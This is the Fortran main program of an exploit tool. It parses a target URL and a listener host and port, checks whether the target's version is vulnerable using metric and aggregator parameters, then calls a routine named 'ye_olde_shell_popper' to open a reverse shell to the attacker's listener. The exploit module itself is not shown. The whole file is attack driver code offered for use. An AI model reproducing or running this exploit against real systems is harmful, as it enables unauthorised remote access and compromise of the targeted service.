program main
  use exploit
  implicit none

  character(len=5) :: lport
  character(len=50) :: target_url, lhost
  character(len=100) :: metric, aggregator
  character(256) :: arg
  integer :: num_args, ix, return_code

  ! parse command line arguments
  num_args = command_argument_count()
  if (num_args < 3) then
    print '(A)', 'Usage: -t <target_url> -l <lhost> -p <lport> [-v]'
    STOP
  end if

  do ix = 1, num_args, 2
    call get_command_argument(ix, arg)
    select case (arg)
    case ('-l')
      call get_command_argument(ix+1, lhost)
    case ('-p')
      call get_command_argument(ix+1, lport)
    case ('-t')
      call get_command_argument(ix+1, target_url)
    case ('-v')
      verbose = .true.
    case default
      print '(A)', 'Usage: -t <target_url> -l <lhost> -p <lport> [-v]'
      STOP
    end select
  end do

  call print_banner()

  return_code = check_target(target_url)
  if (return_code /= 0) then
    STOP
  end if
 
  return_code = check_version(target_url)
  if (return_code /= 0) then
    STOP
  end if

  metric = select_metric(target_url)
  if (len_trim(metric) == 0) then
    STOP
  end if

  aggregator = select_aggregator(target_url)
  if (len_trim(aggregator) == 0) then
    STOP
  end if

  return_code = check_vulnerability_status(target_url, metric, aggregator)
  if (return_code /= 0) then
    STOP
  end if

  ! run the exploit
  return_code = ye_olde_shell_popper(target_url, metric, aggregator, trim(lhost), trim(lport))
end program main
